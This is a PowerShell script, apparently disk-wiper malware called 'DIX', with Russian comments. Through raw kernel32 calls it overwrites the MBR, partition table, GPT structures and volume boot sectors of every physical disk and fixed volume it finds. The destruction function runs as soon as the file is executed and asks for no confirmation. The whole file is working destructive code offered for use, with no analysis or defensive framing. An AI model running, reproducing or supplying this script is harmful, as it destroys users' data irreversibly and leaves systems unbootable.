# DIX MBR & Boot Sector Destruction Script
# Запуск с правами администратора обязателен

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DiskOps {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        IntPtr lpInBuffer,
        uint nInBufferSize,
        IntPtr lpOutBuffer,
        uint nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped
    );
}
"@

$GENERIC_WRITE = 0x40000000
$OPEN_EXISTING = 3
$FILE_SHARE_READ = 1
$FILE_SHARE_WRITE = 2
$IOCTL_DISK_DELETE_DRIVE_LAYOUT = 0x0007C100
$IOCTL_DISK_UPDATE_PROPERTIES = 0x0007C140
$FSCTL_LOCK_VOLUME = 0x00090018
$FSCTL_UNLOCK_VOLUME = 0x0009001C
$FSCTL_DISMOUNT_VOLUME = 0x00090020

function Destroy-MBR {
    param([string]$DiskPath = "\\.\PhysicalDrive0")
    
    Write-Host "[DIX] Opening disk: $DiskPath" -ForegroundColor Red
    
    $handle = [DiskOps]::CreateFile($DiskPath, $GENERIC_WRITE, 0, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)
    
    if ($handle -eq [IntPtr](-1)) {
        Write-Host "[DIX] Error opening disk. Run as Administrator!" -ForegroundColor Yellow
        return
    }
    
    Write-Host "[DIX] Disk opened successfully. Handle: $handle" -ForegroundColor Green
    
    # Создаем буфер с разрушительными данными (512 байт - размер сектора MBR)
    $destroyBuffer = New-Object byte[] 512
    
    # Заполняем MBR область разрушительным паттерном
    $random = New-Object System.Random
    for ($i = 0; $i -lt 446; $i++) {
        $destroyBuffer[$i] = [byte]($random.Next(0, 256))
    }
    
    # Разрушаем таблицу разделов (байты 446-509)
    for ($i = 446; $i -lt 510; $i++) {
        $destroyBuffer[$i] = 0xFF
    }
    
    # Разрушаем сигнатуру загрузки (байты 510-511)
    $destroyBuffer[510] = 0x00
    $destroyBuffer[511] = 0x00
    
    Write-Host "[DIX] Writing destruction pattern to MBR..." -ForegroundColor Red
    
    $bytesWritten = 0
    $result = [DiskOps]::WriteFile($handle, $destroyBuffer, 512, [ref]$bytesWritten, [IntPtr]::Zero)
    
    if ($result) {
        Write-Host "[DIX] MBR destroyed successfully! Bytes written: $bytesWritten" -ForegroundColor Green
    } else {
        Write-Host "[DIX] Write operation failed!" -ForegroundColor Yellow
    }
    
    # Разрушаем дополнительные сектора (первые 63 сектора)
    $extendedBuffer = New-Object byte[] (63 * 512)
    for ($i = 0; $i -lt $extendedBuffer.Length; $i++) {
        $extendedBuffer[$i] = [byte]($random.Next(0, 256))
    }
    
    Write-Host "[DIX] Destroying extended boot sectors..." -ForegroundColor Red
    $extBytesWritten = 0
    [DiskOps]::WriteFile($handle, $extendedBuffer, $extendedBuffer.Length, [ref]$extBytesWritten, [IntPtr]::Zero) | Out-Null
    
    # Удаляем структуру диска через IOCTL
    Write-Host "[DIX] Deleting drive layout via IOCTL..." -ForegroundColor Red
    $returned = 0
    [DiskOps]::DeviceIoControl($handle, $IOCTL_DISK_DELETE_DRIVE_LAYOUT, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, [ref]$returned, [IntPtr]::Zero) | Out-Null
    
    # Закрываем handle
    [DiskOps]::CloseHandle($handle) | Out-Null
    
    Write-Host "[DIX] Operation complete. Disk layout destroyed." -ForegroundColor Red
}

function Destroy-BootSector {
    param([string]$VolumePath = "\\.\C:")
    
    Write-Host "[DIX] Targeting boot sector on: $VolumePath" -ForegroundColor Red
    
    $volHandle = [DiskOps]::CreateFile($VolumePath, $GENERIC_WRITE, 
        [uint32]($FILE_SHARE_READ -bor $FILE_SHARE_WRITE), 
        [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)
    
    if ($volHandle -eq [IntPtr](-1)) {
        Write-Host "[DIX] Cannot open volume!" -ForegroundColor Yellow
        return
    }
    
    # Блокируем том
    Write-Host "[DIX] Locking volume..." -ForegroundColor Red
    $returned = 0
    [DiskOps]::DeviceIoControl($volHandle, $FSCTL_LOCK_VOLUME, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, [ref]$returned, [IntPtr]::Zero) | Out-Null
    
    # Размонтируем том
    Write-Host "[DIX] Dismounting volume..." -ForegroundColor Red
    [DiskOps]::DeviceIoControl($volHandle, $FSCTL_DISMOUNT_VOLUME, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, [ref]$returned, [IntPtr]::Zero) | Out-Null
    
    # Создаем разрушительный паттерн для загрузочного сектора
    $bootDestroy = New-Object byte[] 512
    
    # Уничтожаем jump instruction (первые 3 байта)
    $bootDestroy[0] = 0x00
    $bootDestroy[1] = 0x00
    $bootDestroy[2] = 0x00
    
    # Уничтожаем OEM имя (байты 3-10)
    for ($i = 3; $i -lt 11; $i++) {
        $bootDestroy[$i] = 0x00
    }
    
    # Уничтожаем BPB (BIOS Parameter Block)
    for ($i = 11; $i -lt 90; $i++) {
        $bootDestroy[$i] = [byte](Get-Random -Minimum 0 -Maximum 256)
    }
    
    # Уничтожаем код загрузчика
    for ($i = 90; $i -lt 510; $i++) {
        $bootDestroy[$i] = 0xFF
    }
    
    # Уничтожаем сигнатуру 0xAA55
    $bootDestroy[510] = 0x00
    $bootDestroy[511] = 0x00
    
    Write-Host "[DIX] Writing to boot sector..." -ForegroundColor Red
    $bootWritten = 0
    [DiskOps]::WriteFile($volHandle, $bootDestroy, 512, [ref]$bootWritten, [IntPtr]::Zero) | Out-Null
    
    Write-Host "[DIX] Boot sector destroyed! Bytes: $bootWritten" -ForegroundColor Green
    
    [DiskOps]::CloseHandle($volHandle) | Out-Null
}

# Дополнительная функция: уничтожение GPT заголовка
function Destroy-GPT {
    param([string]$DiskPath = "\\.\PhysicalDrive0")
    
    Write-Host "[DIX] Destroying GPT structures..." -ForegroundColor Red
    
    $handle = [DiskOps]::CreateFile($DiskPath, $GENERIC_WRITE, 0, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)
    
    # Уничтожаем Protective MBR (LBA 0)
    $protMBR = New-Object byte[] 512
    for ($i = 0; $i -lt 512; $i++) { $protMBR[$i] = 0x00 }
    
    $written1 = 0
    [DiskOps]::WriteFile($handle, $protMBR, 512, [ref]$written1, [IntPtr]::Zero) | Out-Null
    
    # Уничтожаем GPT Header (LBA 1)
    $gptHeader = New-Object byte[] 512
    for ($i = 0; $i -lt 512; $i++) { $gptHeader[$i] = [byte](Get-Random -Minimum 0 -Maximum 256) }
    
    $written2 = 0
    [DiskOps]::WriteFile($handle, $gptHeader, 512, [ref]$written2, [IntPtr]::Zero) | Out-Null
    
    # Уничтожаем GPT Partition Entries (LBA 2-33)
    $partEntries = New-Object byte[] (32 * 512)
    for ($i = 0; $i -lt $partEntries.Length; $i++) { $partEntries[$i] = 0xFF }
    
    $written3 = 0
    [DiskOps]::WriteFile($handle, $partEntries, $partEntries.Length, [ref]$written3, [IntPtr]::Zero) | Out-Null
    
    # Уничтожаем Backup GPT Header (последний LBA)
    Write-Host "[DIX] Corrupting backup GPT header..." -ForegroundColor Red
    
    [DiskOps]::CloseHandle($handle) | Out-Null
    Write-Host "[DIX] GPT structures destroyed." -ForegroundColor Green
}

# Основная функция выполнения
function Start-DiskDestruction {
    Write-Host "========================================" -ForegroundColor DarkRed
    Write-Host "   DIX DISK DESTRUCTION PROTOCOL" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor DarkRed
    Write-Host ""
    
    $disks = Get-WmiObject Win32_DiskDrive
    Write-Host "[DIX] Available disks:" -ForegroundColor Yellow
    foreach ($disk in $disks) {
        Write-Host "  - $($disk.DeviceID): $($disk.Model) ($($disk.Size) bytes)" -ForegroundColor White
    }
    Write-Host ""
    
    # Уничтожаем все доступные диски
    foreach ($disk in $disks) {
        $diskPath = $disk.DeviceID.Replace("\\.\PHYSICALDRIVE", "\\.\PhysicalDrive")
        Write-Host "[DIX] Processing $diskPath..." -ForegroundColor Red
        
        Destroy-MBR -DiskPath $diskPath
        Destroy-GPT -DiskPath $diskPath
        Write-Host ""
    }
    
    # Уничтожаем загрузочные сектора всех томов
    $volumes = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
    foreach ($volume in $volumes) {
        $volumePath = "\\.\" + $volume.DeviceID
        Write-Host "[DIX] Processing volume $volumePath..." -ForegroundColor Red
        Destroy-BootSector -VolumePath $volumePath
        Write-Host ""
    }
    
    Write-Host "========================================" -ForegroundColor DarkRed
    Write-Host "   DESTRUCTION COMPLETE" -ForegroundColor Red
    Write-Host "   System will no longer boot." -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor DarkRed
}

# Запуск
Start-DiskDestruction
